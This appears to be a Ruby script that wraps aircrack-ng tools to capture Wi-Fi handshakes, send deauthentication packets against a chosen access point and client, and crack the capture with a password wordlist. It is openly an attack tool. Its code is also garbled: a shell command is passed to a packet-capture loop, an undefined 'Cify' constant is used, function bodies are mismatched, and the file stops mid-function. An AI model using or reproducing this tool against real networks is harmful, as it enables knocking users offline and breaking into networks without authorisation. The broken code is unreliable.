#!/usr/bin/env ruby

require 'pcaprub'
require 'colorize'
require 'optparse'

module Airodump
  def self.run(interface, channel, write_file)
    capture = Pcap::Capture.open_live(interface, 65535, true, 100) do |capture|
      capture.loop(20, "airodump-ng #{interface} --channel #{channel} -w #{write_file}") do
        break if capture.stats.packets.to_i > 1000
      end
    end
  end
end

module Aireplay
  def self.deauth(interface, bssid, client_mac, packets)
    system("aireplay-ng --deauth #{packets} -a #{bssid} -c #{client_mac} #{interface}")
  end
end

module Aircrack
  def self.crack(write_file, password_file)
    system("aircrack-ng #{write_file} -w #{password_file}")
  end
end

def clear_screen
  system('clear') or system('cls')
end

def get_interface
  begin
    system("iwconfig")
    print "\nEnter the #{Cify} wireless interface name: "
    interface = gets.chomp
  rescue StandardError
end
  bssid = ":".insert(2, bssid[0..1]).insert(5, bssid[2..3]).insert(8, bssid[4..5])
  bssid
end

def get_client_mac
  print "Enter the #{Cify} client MAC address: "
  client_mac = gets.chomp.gsub(':', '').upcase
  client_mac = ":".insert(2, client_mac[0..1]).insert(5, client_mac[2..3]).insert(8, client_mac[4..5])
  client_mac
end

def get_packets
  begin
    print "Enter the number of deauth packets: "
    packets = gets.chomp.to_i
  rescue StandardError
    puts "Invalid packets number. Please enter an integer value."
    packets = get_packets
  end
  packets
end

def get_write_file
  begin
    print "\nEnter the #{Cify} .cap file name: "
    write_file = gets.chomp + '.cap'
  rescue StandardError
    puts "Error: Invalid file name."
    write_file = get_write_file
  end
  write_file
end

def get_password_file
  begin
    print "Enter the #{Cify} password file name: "
